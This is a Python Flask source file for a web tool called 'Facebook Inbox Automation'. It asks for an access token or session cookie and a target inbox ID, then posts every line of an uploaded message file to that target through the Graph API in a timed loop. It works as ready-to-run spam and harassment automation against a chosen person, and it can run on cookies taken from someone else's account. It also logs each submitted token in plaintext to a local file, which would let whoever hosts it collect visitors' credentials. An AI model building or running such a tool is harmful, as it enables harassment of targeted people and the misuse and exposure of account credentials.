from flask import Flask, request, redirect, url_for
import os
import time
import requests

app = Flask(__name__)

@app.route('/')
def form():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook Inbox Automation</title>
        <style>
            body {
                background-color: #282c34;
                color: #fff;
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                width: 400px;
                background: #3c3f47;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            }
            .form-control {
                width: 100%;
                margin-bottom: 15px;
                padding: 10px;
                border: none;
                border-radius: 5px;
            }
            .btn {
                width: 100%;
                padding: 10px;
                background: #4CAF50;
                color: #fff;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
            }
            .btn:hover {
                background: #45a049;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Facebook Inbox Automation</h2>
            <form action="/" method="POST" enctype="multipart/form-data">
                <label for="token">Enter Token or Cookie:</label>
                <input type="text" class="form-control" id="token" name="token" required>
                
                <label for="target_id">Target Inbox ID:</label>
                <input type="text" class="form-control" id="target_id" name="target_id" required>
                
                <label for="messages_file">Select Message File (.txt):</label>
                <input type="file" class="form-control" id="messages_file" name="messages_file" accept=".txt" required>
                
                <label for="delay">Delay Between Messages (in seconds):</label>
                <input type="number" class="form-control" id="delay" name="delay" value="10" required>
                
                <button type="submit" class="btn">Submit</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/', methods=['POST'])
def send_messages():
    # Retrieve form data
    token = request.form.get('token')
    target_id = request.form.get('target_id')
    delay = int(request.form.get('delay'))
    messages_file = request.files['messages_file']
    
    # Read messages from the uploaded file
    messages = messages_file.read().decode('utf-8').splitlines()
    num_messages = len(messages)

    # Ensure output folder exists
    output_folder = "automation_results"
    os.makedirs(output_folder, exist_ok=True)

    # Save input details for logging
    with open(os.path.join(output_folder, "details.txt"), "w") as f:
        f.write(f"Token: {token}\n")
        f.write(f"Target ID: {target_id}\n")
        f.write(f"Delay: {delay} seconds\n")
        f.write(f"Messages: {num_messages} messages loaded\n")

    # Facebook Graph API URL
    send_url = f"https://graph.facebook.com/v15.0/{target_id}/messages"

    # Loop through messages and send them
    for index, message in enumerate(messages):
        payload = {
            "access_token": token,
            "message": message
        }

        try:
            response = requests.post(send_url, data=payload)
            if response.status_code == 200:
                print(f"[+] Sent message {index + 1}/{num_messages}: {message}")
            else:
                print(f"[x] Failed to send message {index + 1}: {response.json()}")
        except Exception as e:
            print(f"[!] Error sending message {index + 1}: {e}")

        # Wait for the specified delay
        time.sleep(delay)

    return redirect(url_for('form'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
        
